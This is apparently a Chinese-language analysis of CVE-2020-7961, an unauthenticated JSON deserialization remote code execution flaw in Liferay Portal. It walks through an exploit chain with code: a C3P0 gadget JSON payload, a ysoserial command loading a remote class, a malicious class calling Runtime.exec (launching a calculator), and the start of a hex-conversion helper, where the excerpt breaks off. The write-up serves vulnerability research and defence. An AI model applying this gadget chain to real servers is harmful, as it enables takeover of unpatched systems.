#### 漏洞描述
近日,Code White公开了在Liferay
Portal中发现的JSON反序列化高危漏洞,未授权的攻击者可以通过精心构造的恶意数据对API接口发起远程代码执行的攻击.  
Liferay是一个开源的Portal产品,提供对多个独立系统的内容集成,为企业信息、流程等的整合提供了一套完整的解决方案,和其他商业产品相比,Liferay有着很多优良的特性,而且免费,在全球都有较多用户.
#### 漏洞编号
CVE-2020-7961  
LPS-88051/LPE-165981
#### 漏洞威胁等级
高危
#### 影响范围
Liferay Portal 6.1.X  
Liferay Portal 6.2.X  
Liferay Portal 7.0.X  
Liferay Portal 7.1.X  
Liferay Portal 7.2.X
#### 简单分析
##### 1.漏洞成因
Liferay Portal其实主要是两个版本存在问题,一个是6.X,另一个是7.X.  
6.X使用的是`Flexjson`对json数据进行处理,而7.X则使用`Jodd
Json`.因为api并不接收纯json数据,所以这里我只研究了6.X的`Flexjson`,但对于api来说payload为通用的并不需要划分版本.
##### 2.Flexjson的RCE
我们先搭建Flexjson的环境,直接使用pom导入如下xml即可
                net.sf.flexjson
                flexjson
                3.1
查阅文档我们可知,`Flexjson`处理json的写法如下
    JSONDeserializer jsonDeserializer = new JSONDeserializer();
            try {
                jsonDeserializer.deserialize(json);
            }catch (Exception e){
                e.printStackTrace();
            }
这里我们只需要传入一个json的字符串即可.如果我们要测试rce,则需要构造一个声明类的恶意json数据.例如声明`javax.swing.JEditorPane`.
这个类几天前可用作`Jackson
Databind`和`fastjson`的ssrf探测,当然都需要打开autotype开关才行.而在`Flexjson`中,这个类并不存在于黑名单中,可以直接使用.接下来的问题是如何RCE?我尝试构造了恶意的json,发现`C3P0`和`com.sun.rowset.JdbcRowSetImpl`这两个gagdet是可以使用的.
这里给出一段`C3P0`的示例json.
    String json2 = "{\"class\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\"userOverridesAsString\":\"HexAsciiSerializedMap}";
这段payload主要为声明调用的class是`com.mchange.v2.c3p0.WrapperConnectionPoolDataSource`,且使用`userOverridesAsString`这个setter,对于传入的`HexAsciiSerializedMap`其实为序列化文件的hex编码.序列化文件我们可以使用ysoserial生成.  
`java -jar ysoserial.jar C3P0 "http://127.0.0.1/:ExportObject" > 1.ser`
`C3P0`的gagdet使用需要在http协议下进行加载恶意的class,在http协议下使用`:`进行绑定.我给出如下恶意类的源码.
    import java.io.BufferedReader;
    import java.io.InputStream;
    import java.io.InputStreamReader;
    public class ExportObject {
        public ExportObject() throws Exception {
            Process p = Runtime.getRuntime().exec("open -a calculator");
            InputStream is = p.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));
            String line;
            while((line = reader.readLine()) != null) {
                System.out.println(line);
            }
            p.waitFor();
            is.close();
            reader.close();
            p.destroy();
        }
        public static void main(String[] args) throws Exception {
        }
    }
既然序列化文件`1.ser`生成好了怎么转换为hex字节码了?我在CVE-2019-2725的时候就问过好兄弟afanti这个问题,从他那里我得到了答案.
    import java.io.ByteArrayOutputStream;
    import java.io.FileInputStream;
    import java.io.IOException;
    import java.io.InputStream;
    public class Echo3 {
        public Echo3() {
        }
        public static void main(String[] args) throws IOException {
            InputStream in = new FileInputStream("/Users/xue/Documents/NetSafe/Tools/JavaTools/1.ser");
            byte[] data = toByteArray(in);
            in.close();
            String HexString = bytesToHexString(data, 4984);
            System.out.println(HexString);
        }